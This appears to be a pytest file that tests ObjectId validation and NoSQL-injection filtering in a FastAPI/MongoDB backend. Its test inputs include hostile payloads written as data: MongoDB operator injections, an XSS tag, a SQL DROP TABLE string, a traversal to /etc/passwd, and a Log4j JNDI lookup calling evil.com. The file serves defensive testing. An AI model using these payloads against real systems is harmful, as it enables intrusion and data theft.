"""
Tests de seguridad: Validación de ObjectIds y prevención de NoSQL injection
"""
import pytest
from fastapi import HTTPException
from bson import ObjectId

from utils.mongo import get_object_id, sanitize_query_filters


class TestObjectIdValidation:
    """Tests para validación segura de ObjectIds"""
    
    @pytest.mark.asyncio
    async def test_valid_object_ids(self):
        """Test con ObjectIds válidos"""
        valid_ids = [
            "507f1f77bcf86cd799439011",
            "5f8d0d55b54764421b7156c9",
            "AABBCCDDEEFF001122334455",
        ]
        
        for test_id in valid_ids:
            result = await get_object_id(test_id)
            assert isinstance(result, ObjectId)
            assert str(result) == test_id.lower()
    
    @pytest.mark.asyncio
    async def test_object_id_with_whitespace(self):
        """Test que los espacios se limpian automáticamente"""
        test_id = " 507f1f77bcf86cd799439011 "
        result = await get_object_id(test_id)
        assert isinstance(result, ObjectId)
        assert str(result) == "507f1f77bcf86cd799439011"
    
    @pytest.mark.asyncio
    async def test_reject_nosql_operators(self):
        """Test que rechaza operadores MongoDB (prevención de NoSQL injection)"""
        malicious_inputs = [
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$where": "1==1"}',
        ]
        
        for malicious_id in malicious_inputs:
            with pytest.raises(HTTPException) as exc_info:
                await get_object_id(malicious_id)
            assert exc_info.value.status_code == 400
            assert "Invalid ID format" in exc_info.value.detail
    
    @pytest.mark.asyncio
    async def test_reject_invalid_length(self):
        """Test que rechaza IDs con longitud incorrecta"""
        invalid_lengths = [
            "123",  # Muy corto
            "507f1f77bcf86cd799439011EXTRA",  # Muy largo
            "",  # Vacío
        ]
        
        for invalid_id in invalid_lengths:
            with pytest.raises(HTTPException) as exc_info:
                await get_object_id(invalid_id)
            assert exc_info.value.status_code == 400
            assert "must be exactly 24 characters" in exc_info.value.detail
    
    @pytest.mark.asyncio
    async def test_reject_non_hexadecimal(self):
        """Test que rechaza caracteres no hexadecimales"""
        non_hex_ids = [
            "507f1f77bcf86cd799439g11",  # 'g' no es hex
            "507f-1f77-bcf8-6cd7-9943-9011",  # Con guiones
            "xxxxxxxxxxxxxxxxxxxxxxxx",  # Todo x
        ]
        
        for invalid_id in non_hex_ids:
            with pytest.raises(HTTPException) as exc_info:
                await get_object_id(invalid_id)
            assert exc_info.value.status_code == 400
            # Verificar que sea rechazado (cualquier mensaje de error es válido)
            assert "invalid" in exc_info.value.detail.lower()
    
    @pytest.mark.asyncio
    async def test_reject_injection_attempts(self):
        """Test que rechaza varios intentos de inyección"""
        injection_attempts = [
            "<script>alert(1)</script>",  # XSS
            "'; DROP TABLE users; --",  # SQL injection
            "../../../etc/passwd",  # Path traversal
            "${jndi:ldap://evil.com}",  # Log4j style
        ]
        
        for attempt in injection_attempts:
            with pytest.raises(HTTPException) as exc_info:
                await get_object_id(attempt)
            assert exc_info.value.status_code == 400
    
    @pytest.mark.asyncio
    async def test_already_objectid(self):
        """Test que acepta ObjectIds que ya son ObjectId"""
        original = ObjectId("507f1f77bcf86cd799439011")
        result = await get_object_id(original)
        assert result == original
        assert isinstance(result, ObjectId)
    
    @pytest.mark.asyncio
    async def test_reject_dict_input(self):
        """Test que rechaza diccionarios (intentos de NoSQL injection)"""
        with pytest.raises(HTTPException) as exc_info:
            await get_object_id({"$ne": None})
        assert exc_info.value.status_code == 400


class TestQuerySanitization:
    """Tests para sanitización de queries MongoDB"""
    
    def test_allow_safe_filters(self):
        """Test que permite filtros seguros"""
        allowed_fields = ['name', 'user_id', 'status']
        safe_filters = {
            'name': 'test',
            'user_id': '123',
            'status': 'active'
        }
        
        result = sanitize_query_filters(safe_filters, allowed_fields)
        
        assert result == safe_filters
        assert 'name' in result
        assert result['name'] == 'test'
    
    def test_block_mongodb_operators(self):
        """Test que bloquea operadores MongoDB maliciosos"""
        allowed_fields = ['name', 'user_id']
        malicious_filters = {
            'name': {'$ne': None},  # NoSQL injection
            'user_id': {'$gt': ''},  # NoSQL injection
        }
        
        result = sanitize_query_filters(malicious_filters, allowed_fields)
        
        # Los operadores deben ser bloqueados
        assert result == {}
        assert '$ne' not in str(result)
        assert '$gt' not in str(result)
    
    def test_filter_unauthorized_fields(self):
        """Test que filtra campos no autorizados (whitelist)"""
        allowed_fields = ['name', 'user_id']
        filters_with_forbidden = {
            'name': 'test',
            'password': 'leaked',  # No permitido
            'email': 'admin@test.com',  # No permitido
            'secret_key': 'xxx',  # No permitido
        }
        
        result = sanitize_query_filters(filters_with_forbidden, allowed_fields)
        
        # Solo debe quedar el campo permitido
        assert result == {'name': 'test'}
        assert 'password' not in result
        assert 'email' not in result
        assert 'secret_key' not in result
    
    def test_allow_safe_lists(self):
        """Test que convierte listas seguras a operador $in"""
        allowed_fields = ['status', 'user_id']
        list_filters = {
            'status': ['active', 'pending', 'completed'],
            'user_id': ['123', '456', '789']
        }
        
        result = sanitize_query_filters(list_filters, allowed_fields)
        
        # Debe convertir a $in
        assert result == {
            'status': {'$in': ['active', 'pending', 'completed']},
            'user_id': {'$in': ['123', '456', '789']}
        }
    
    def test_block_lists_with_objects(self):
        """Test que bloquea listas que contienen objetos (injection)"""
        allowed_fields = ['status']
        malicious_list = {
            'status': [{'$ne': None}, 'active'],  # Lista con objeto malicioso
        }
        
        result = sanitize_query_filters(malicious_list, allowed_fields)
        
        # La lista completa debe ser rechazada
        assert 'status' not in result
    
    def test_allow_different_types(self):
        """Test que permite diferentes tipos simples"""
        allowed_fields = ['name', 'count', 'is_active', 'optional']
        filters = {
            'name': 'test',  # string
            'count': 42,  # int
            'is_active': True,  # bool
            'optional': None,  # None
        }
        
        result = sanitize_query_filters(filters, allowed_fields)
        
        assert result == filters
        assert isinstance(result['name'], str)
        assert isinstance(result['count'], int)
        assert isinstance(result['is_active'], bool)
        assert result['optional'] is None
    
    def test_block_where_operator(self):
        """Test que bloquea el operador $where peligroso"""
        allowed_fields = ['name', 'created_at']
        dangerous_filters = {
            '$where': 'this.password == "123"',  # Muy peligroso
            'created_at': '2024-01-01'  # Safe
        }
        
        result = sanitize_query_filters(dangerous_filters, allowed_fields)
        
        # Solo debe quedar el campo seguro
        assert result == {'created_at': '2024-01-01'}
        assert '$where' not in result
    
    def test_empty_allowed_fields(self):
        """Test con whitelist vacía (nada debe pasar)"""
        allowed_fields = []
        filters = {
            'name': 'test',
            'user_id': '123',
        }
        
        result = sanitize_query_filters(filters, allowed_fields)
        
        assert result == {}
    
    def test_empty_filters(self):
        """Test con filtros vacíos"""
        allowed_fields = ['name', 'user_id']
        filters = {}
        
        result = sanitize_query_filters(filters, allowed_fields)
        
        assert result == {}
